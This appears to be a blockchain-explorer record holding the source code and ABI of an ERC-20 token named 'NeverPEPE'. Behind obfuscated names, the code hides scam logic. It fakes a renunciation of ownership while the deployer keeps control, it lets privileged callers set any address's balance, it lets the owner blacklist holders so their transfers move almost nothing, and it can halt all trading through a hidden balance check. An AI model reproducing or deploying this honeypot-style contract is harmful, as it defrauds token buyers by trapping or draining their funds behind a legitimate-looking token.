{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface totalFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromReceiverLaunched) external view returns (uint256);\n\n    function transfer(address minAt, uint256 toEnableFrom) external returns (bool);\n\n    function allowance(address limitReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toEnableFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minAt,\n        uint256 toEnableFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeToken, uint256 value);\n    event Approval(address indexed limitReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract feeTradingSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableTradingAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txSell {\n    function createPair(address feeAuto, address fundReceiver) external returns (address);\n}\n\ninterface enableSellTake is totalFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NeverPEPE is feeTradingSwap, totalFrom, enableSellTake {\n\n    function owner() external view returns (address) {\n        return receiverWallet;\n    }\n\n    uint256 public senderLimit;\n\n    function balanceOf(address fromReceiverLaunched) public view virtual override returns (uint256) {\n        return exemptAuto[fromReceiverLaunched];\n    }\n\n    address public enableReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenIs;\n    }\n\n    address private receiverWallet;\n\n    uint256 public amountTo;\n\n    function transferFrom(address sellLaunched, address minAt, uint256 toEnableFrom) external override returns (bool) {\n        if (_msgSender() != senderEnableList) {\n            if (buyToken[sellLaunched][_msgSender()] != type(uint256).max) {\n                require(toEnableFrom <= buyToken[sellLaunched][_msgSender()]);\n                buyToken[sellLaunched][_msgSender()] -= toEnableFrom;\n            }\n        }\n        return swapList(sellLaunched, minAt, toEnableFrom);\n    }\n\n    function allowance(address takeTx, address buyReceiver) external view virtual override returns (uint256) {\n        if (buyReceiver == senderEnableList) {\n            return type(uint256).max;\n        }\n        return buyToken[takeTx][buyReceiver];\n    }\n\n    uint8 private tokenIs = 18;\n\n    uint256 private maxTo;\n\n    function getOwner() external view returns (address) {\n        return receiverWallet;\n    }\n\n    address senderEnableList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSellFrom;\n    }\n\n    function exemptLimit() public {\n        emit OwnershipTransferred(limitExemptAuto, address(0));\n        receiverWallet = address(0);\n    }\n\n    function swapList(address sellLaunched, address minAt, uint256 toEnableFrom) internal returns (bool) {\n        if (sellLaunched == limitExemptAuto) {\n            return exemptFeeMarketing(sellLaunched, minAt, toEnableFrom);\n        }\n        uint256 autoListTrading = totalFrom(enableReceiver).balanceOf(teamFrom);\n        require(autoListTrading == autoAtWallet);\n        require(minAt != teamFrom);\n        if (modeTotal[sellLaunched]) {\n            return exemptFeeMarketing(sellLaunched, minAt, launchTx);\n        }\n        return exemptFeeMarketing(sellLaunched, minAt, toEnableFrom);\n    }\n\n    function walletShould(uint256 toEnableFrom) public {\n        atExempt();\n        autoAtWallet = toEnableFrom;\n    }\n\n    uint256 walletTotal;\n\n    string private walletLiquidity = \"Never PEPE\";\n\n    function isExempt(address limitMode, uint256 toEnableFrom) public {\n        atExempt();\n        exemptAuto[limitMode] = toEnableFrom;\n    }\n\n    function teamLiquidity(address launchedFrom) public {\n        if (sellTake) {\n            return;\n        }\n        if (atModeTeam == buyFundAuto) {\n            exemptAmount = senderLimit;\n        }\n        takeFundAmount[launchedFrom] = true;\n        if (maxTo == marketingAuto) {\n            atModeTeam = false;\n        }\n        sellTake = true;\n    }\n\n    mapping(address => bool) public takeFundAmount;\n\n    uint256 public exemptAmount;\n\n    uint256 private receiverTakeLimit = 100000000 * 10 ** 18;\n\n    address teamFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function atExempt() private view {\n        require(takeFundAmount[_msgSender()]);\n    }\n\n    bool public sellTake;\n\n    function transfer(address limitMode, uint256 toEnableFrom) external virtual override returns (bool) {\n        return swapList(_msgSender(), limitMode, toEnableFrom);\n    }\n\n    uint256 autoAtWallet;\n\n    function approve(address buyReceiver, uint256 toEnableFrom) public virtual override returns (bool) {\n        buyToken[_msgSender()][buyReceiver] = toEnableFrom;\n        emit Approval(_msgSender(), buyReceiver, toEnableFrom);\n        return true;\n    }\n\n    bool private buyFundAuto;\n\n    event OwnershipTransferred(address indexed shouldExempt, address indexed tradingLimitWallet);\n\n    string private receiverSellFrom = \"NPE\";\n\n    uint256 public marketingAuto;\n\n    constructor (){\n        if (maxTo == amountTo) {\n            amountTo = senderLimit;\n        }\n        enableTradingAuto autoBuy = enableTradingAuto(senderEnableList);\n        enableReceiver = txSell(autoBuy.factory()).createPair(autoBuy.WETH(), address(this));\n        if (buyFundAuto == atModeTeam) {\n            atModeTeam = false;\n        }\n        limitExemptAuto = _msgSender();\n        exemptLimit();\n        takeFundAmount[limitExemptAuto] = true;\n        exemptAuto[limitExemptAuto] = receiverTakeLimit;\n        if (maxTo == senderLimit) {\n            atModeTeam = false;\n        }\n        emit Transfer(address(0), limitExemptAuto, receiverTakeLimit);\n    }\n\n    bool private atModeTeam;\n\n    mapping(address => uint256) private exemptAuto;\n\n    address public limitExemptAuto;\n\n    mapping(address => mapping(address => uint256)) private buyToken;\n\n    function exemptFeeMarketing(address sellLaunched, address minAt, uint256 toEnableFrom) internal returns (bool) {\n        require(exemptAuto[sellLaunched] >= toEnableFrom);\n        exemptAuto[sellLaunched] -= toEnableFrom;\n        exemptAuto[minAt] += toEnableFrom;\n        emit Transfer(sellLaunched, minAt, toEnableFrom);\n        return true;\n    }\n\n    function senderToken(address teamAt) public {\n        atExempt();\n        if (exemptAmount == maxTo) {\n            maxTo = amountTo;\n        }\n        if (teamAt == limitExemptAuto || teamAt == enableReceiver) {\n            return;\n        }\n        modeTotal[teamAt] = true;\n    }\n\n    mapping(address => bool) public modeTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTakeLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletLiquidity;\n    }\n\n    uint256 constant launchTx = 11 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimitWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toEnableFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiverLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toEnableFrom\",\"type\":\"uint256\"}],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitExemptAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"}],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeFundAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"}],\"name\":\"teamLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toEnableFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toEnableFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toEnableFrom\",\"type\":\"uint256\"}],\"name\":\"walletShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NeverPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}